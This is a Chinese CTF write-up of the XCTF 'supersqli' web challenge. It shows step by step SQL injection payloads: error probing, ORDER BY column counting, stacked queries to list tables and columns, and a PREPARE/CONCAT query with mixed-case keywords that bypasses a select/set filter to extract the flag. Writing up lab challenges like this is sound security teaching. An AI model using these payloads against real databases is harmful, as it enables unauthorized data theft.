---
title: wp-攻防世界WEB-supersqli
date: 2020-07-08 20:37:25
id: 20200708203725
tags: 
	- CTF
	- writeup
categories: 网络安全
keywords: supersqli
---

首先先判断注入类型。可以通过输入一些字符串，在判断是否存在注入的同时判断注入类型。

```sql
?inject=1-0
?inject=1 \
?inject=1'
```

测试发现在输入`1'`和`1 \`时会出现报错信息。

![image-20200708204254295](https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204254295.png)

![image-20200708204320617](https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204320617.png)

发现该位置是一个字符型的注入。因此构造注入语句判断该注入有几个注入位置。

```sql
?inject=1' order by x %23
```

> 这里的%23是#的url编码，因为#在url中代表这锚点，有自己的意义，一次要编码。也可使用`--+`、`--%20`等。

当x为3时报错，因此之后两列。

```sql
?inject=1' union select 1,2
```

执行后发现，正则会过滤select等关键字符串。

![image-20200708204930318](https://superj.oss-cn-beijing.aliyuncs.com/image-20200708204930318.png)

在尝试内嵌注释语句打算绕过过滤后，发现无用，尝试堆叠注入。

```sql
?inject=1';show tables %23
```

执行后，得到表名。

![image-20200708205847423](https://superj.oss-cn-beijing.aliyuncs.com/image-20200708205847423.png)

分别查看两个表中的内容。

```sql
?inject=1';show columns from words; %23
?inject=1';show columns from `1919810931114514`; %23
```

> 表名是数字或者是其他特殊点的字符组成的要用``来包住，表名中间的是表名、数据库名、字段名。

<img src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708210551880.png" alt="image-20200708210551880" style="zoom:50%;" />

<img src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708210612599.png" alt="image-20200708210612599" style="zoom:50%;" />

可以看到在`1919810931114514`中有flag字段。现在就需要拿到flag字段中的值。`select`关键字被过滤。我们可以通过预编译来绕过。

```sql
?inject=1';set @sql = concat('sel','ect flag from `1919810931114514`');prepare stmt from @sql;execute stmt; %23
```

<img src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200708211458209.png" alt="image-20200708211458209" style="zoom:50%;" />

发现通过`strstr`过滤了set和prepare，但是这个函数区分大小写，所以通过大小写绕过。

```sql
?inject=1';sEt @sql = concat('sel','ect flag from `1919810931114514`');prepAre stmt from @sql;execute stmt; %23
```

得到flag：flag{c168d583ed0d4d7196967b28cbd0b5e9}。

# 总结

通过这道题目，首先知道了`#`为什么在注入的时候达不到预期的情况，然后知道了堆叠注入的姿势，在常规的注入不成功的时候，可以考虑一下这种注入方式。最后也掌握了通过预编译的方式，通过concat函数绕过关键字符串的限制，同时，也了解`strstr`函数时区分大小写的。